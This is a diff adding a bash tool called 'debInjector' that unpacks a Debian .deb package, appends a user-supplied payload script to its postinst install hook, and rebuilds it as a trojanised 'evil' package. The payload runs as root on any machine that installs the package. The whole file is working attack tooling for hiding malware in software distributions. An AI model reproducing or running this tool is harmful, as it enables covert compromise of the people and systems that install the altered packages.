@@ -1,0 +1,76 @@
+#!/bin/bash
+# mv to /usr/local/bin
+
+RED1='\033[5;31m'
+RED='\033[1;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+YELLOW1='\033[0;33m'
+BULE='\033[0;34m'
+RESET='\033[0m'
+
+
+banner (){
+  echo ""
+  echo ""
+  echo -e "${RED}     _      _       _        _           _             ${RESET}"
+  echo -e "${RED}  __| | ___| |__   (_)_ __  (_) ___  ___| |_ ___  _ __ ${RESET}"
+ echo -e "${RED} / _\` |/ _ \ '_ \  | | '_ \ | |/ _ \/ __| __/ _ \| '__|${RESET}"
+  echo -e "${RED}| (_| |  __/ |_) | | | | | || |  __/ (__| || (_) | |   ${RESET}"
+  echo -e "${RED} \__,_|\___|_.__/  |_|_| |_|/ |\___|\___|\__\___/|_|   ${RESET}"
+  echo -e "${RED}                           |_/       4m3rr0r                 ${RESET}"     
+  echo ""                                              
+  echo ""
+
+}
+
+banner 
+
+if [[ ${UID} != 0 ]] 
+then 
+    echo -e " ${RED1} Please run as root ${RESET} "
+    exit 1
+fi
+
+if ! which debInjector > /dev/null;
+then 
+    sudo cp debInjector /usr/local/bin/ > /dev/null;
+fi
+
+if [[ ${1} == "-h" ]] || [[ ${1} == "--help" ]] 
+then 
+    echo "Usage: $0 -d debian_package -b bash_file"
+    echo ""
+    echo -e " ${BULE} Inject bash scripts in debian packages. ${RESET} "
+    echo ""
+    echo "  -h, --help          Display this help menu"
+    echo "  -v, --version       show program's version number and exit   "
+    echo "  -d  debian package  target debian package"
+    echo "  -b  bash script     bash script containing payload"
+   
+    exit 1
+elif [[ ${1} == "-v" ]] || [[ ${1} == "--version" ]]
+then
+    echo -e "${YELLOW} program version 1.0.0 ${RESET} "
+elif [[ ${1} == "-d" ]] && [[ ${2} == *.deb ]] && [[ ${3} == "-b" ]] && [[ ${4} == *.txt ]]  || [[ ${4} == *.sh ]] 
+then 
+    echo " " 
+    echo -e "${RED1}[+] Please wait ${RESET}"
+    echo -e ""
+    echo -e " ${BULE}[+] extract the ${2} file ${RESET} "
+    dpkg-deb -R ${2} ${2/.deb/evil}
+    echo -e " ${GREEN}[+] injecting the bash payload ${RESET} "
+    cat ${4} >> ${2/.deb/evil}/DEBIAN/postinst
+    echo -e " ${BULE}[+] bulid the ${2}  ${RESET}"
+    dpkg-deb --build ${2/.deb/evil} > /dev/null;
+  #  sudo rm -r ${2/.deb/evil} /dev/null;
+    echo -e " ${GREEN}[+] the payload has been successfully injected into the Debian package ${RESET}"
+    exit 1
+else 
+    echo ""
+    echo -e "\033[31mError: Invalid option\033[0m"
+    echo ""
+    echo "Try '$0 -h or --help' for more information."
+    exit 1
+    
+fi
